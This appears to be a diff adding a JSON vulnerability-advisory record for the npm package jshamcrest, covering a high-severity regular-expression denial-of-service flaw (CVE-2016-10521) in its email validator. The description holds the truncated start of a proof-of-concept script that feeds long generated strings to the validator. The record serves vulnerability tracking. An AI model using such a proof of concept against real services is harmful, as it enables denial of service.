@@ -1,0 +1,32 @@
+{
+  "packageName": "jshamcrest",
+  "lastUpdated": "2026-05-04T13:06:56.926Z",
+  "vulnerabilities": [
+    {
+      "id": "GHSA-xj62-87pg-vcv3",
+      "packageName": "jshamcrest",
+      "title": "Regular Expression Denial of Service in jshamcrest",
+      "description": "The `jshamcrest` package is affected by a regular expression denial of service vulnerability when certain types of user input are passed in to the emailAddress validator.\n\n\n## Proof of concept\n\n```js\nvar js = require('jshamcrest')\nvar emailAddress = new js.JsHamcrest.Matchers.emailAddress();\n\n\nvar genstr = function (len, chr) {\n    var result = \"\";\n    for (i=0; i<=len; i++) {\n        result = result + chr;\n    }\n\n    return result;\n}\n\n\nfor (i=1;i<=10000000;i=i+1) {\n    console.log(\"COUNT: \" + i",
+      "severity": "high",
+      "url": "https://github.com/advisories/GHSA-xj62-87pg-vcv3",
+      "publishedAt": "2019-02-18T23:38:51Z",
+      "modifiedAt": "2023-09-13T22:47:34Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-xj62-87pg-vcv3"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2016-10521"
+        }
+      ],
+      "affectedVersions": [
+        {
+          "range": "<= 0.7.1"
+        }
+      ],
+      "source": "github"
+    }
+  ]
+}
